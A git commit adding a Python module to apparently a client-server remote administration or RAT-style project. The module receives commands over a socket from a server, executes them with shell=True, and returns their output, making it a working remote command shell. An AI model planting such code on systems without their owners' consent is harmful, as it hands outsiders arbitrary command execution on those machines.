acb73e054791bdcd676d3c0c18530f7de0e9c0b8
Asaf-Zanjiri <60044819+Asaf-Zanjiri@users.noreply.github.com>
2021-05-25 18:19:45 +0300

    Add files via upload
    - Cleaning the code.
    - Adding some documentation.
    - Adding restart and shutdown options.

---
+++ client_folder/Modules/shell.py
@@ -0,0 +1,30 @@
+import subprocess
+import os
+
+
+def shell(client):
+    """
+    Executes shell commands from the server.
+    :param client: Client socket object
+    """
+    while True:
+        data = client.receive()
+        output_str = ''
+        if data == 'quit':
+            break
+        elif data[:2] == 'cd' and len(data) > 2:
+            try:
+                os.chdir(data[3:].strip())
+            except Exception as e:
+                output_str = '[!] Could not change directory: {}\n'.format(e)
+            else:
+                output_str = ''
+        elif len(data) > 0:
+            try:
+                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = output_bytes.decode('utf-8', errors='replace')
+            except Exception as e:
+                output_str = '[!] Command execution unsuccessful: {}\n'.format(e)
+        if output_str is not None:
+            client.send(os.getcwd() + '>' + output_str)  # Sends message in the format of: "dir>output"
